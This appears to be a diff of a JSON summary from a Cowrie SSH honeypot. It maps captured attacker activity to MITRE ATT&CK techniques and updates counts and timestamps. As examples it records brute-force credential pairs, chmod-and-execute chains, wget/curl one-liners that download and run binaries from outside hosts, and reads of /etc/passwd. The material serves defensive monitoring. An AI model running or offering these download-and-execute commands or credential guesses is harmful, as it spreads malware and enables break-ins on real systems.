@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-03 12:03:44",
+  "generated": "2026-09-03 13:01:20",
   "totals": {
-    "commands": 207,
-    "login_failed": 1358,
-    "login_success": 81,
-    "sessions": 1561
+    "commands": 223,
+    "login_failed": 1409,
+    "login_success": 88,
+    "sessions": 1613
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1358,
+      "count": 1409,
       "examples": [
         "root / P@ssw0rd123",
         "root / Fazel@1234",
@@ -21,14 +21,14 @@
         "root / P@ssw0rd1234"
       ],
       "first": "2026-09-03T00:01:47.872746Z",
-      "last": "2026-09-03T12:02:37.023992Z",
-      "unique_ips": 154
+      "last": "2026-09-03T13:00:41.431743Z",
+      "unique_ips": 165
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 81,
+      "count": 88,
       "examples": [
         "support / passw0rd",
         "debian / debian",
@@ -37,14 +37,14 @@
         "guest / guest"
       ],
       "first": "2026-09-03T00:16:24.431802Z",
-      "last": "2026-09-03T11:59:50.641896Z",
-      "unique_ips": 69
+      "last": "2026-09-03T13:00:41.940277Z",
+      "unique_ips": 75
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 56,
+      "count": 57,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-03T04:07:44.788164Z",
-      "last": "2026-09-03T10:10:12.530625Z",
-      "unique_ips": 4
+      "last": "2026-09-03T12:52:31.196897Z",
+      "unique_ips": 5
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 33,
+      "count": 34,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,20 +69,21 @@
         "wget http://play.nopixel-rp.ir/iran.x86_64 -O x86_64 || curl http://play.nopixel-rp.ir/iran.x86_64 -o x86_64"
       ],
       "first": "2026-09-03T04:07:46.468687Z",
-      "last": "2026-09-03T10:10:12.530625Z",
-      "unique_ips": 4
+      "last": "2026-09-03T12:52:31.196897Z",
+      "unique_ips": 5
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "id"
       ],
       "first": "2026-09-03T04:07:46.468687Z",
-      "last": "2026-09-03T10:09:36.715191Z",
-      "unique_ips": 3
+      "last": "2026-09-03T12:52:30.839226Z",
+      "unique_ips": 4
     },
     {
       "id": "T1082",
@@ -97,6 +98,18 @@
       "first": "2026-09-03T00:56:20.748613Z",
       "last": "2026-09-03T09:55:47.558296Z",
       "unique_ips": 3
+    },
+    {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-09-03T12:52:30.843808Z",
+      "last": "2026-09-03T12:52:30.843808Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
@@ -106,11 +119,11 @@
     ],
     [
       "shell",
-      10
+      11
     ],
     [
       "sh",
-      10
+      11
     ],
     [
       "zalee",
@@ -125,16 +138,16 @@
       10
     ],
     [
+      "system",
+      8
+    ],
+    [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       8
     ],
     [
-      "system",
-      7
-    ],
-    [
       "enable",
-      4
+      5
     ],
     [
       "linuxshell",
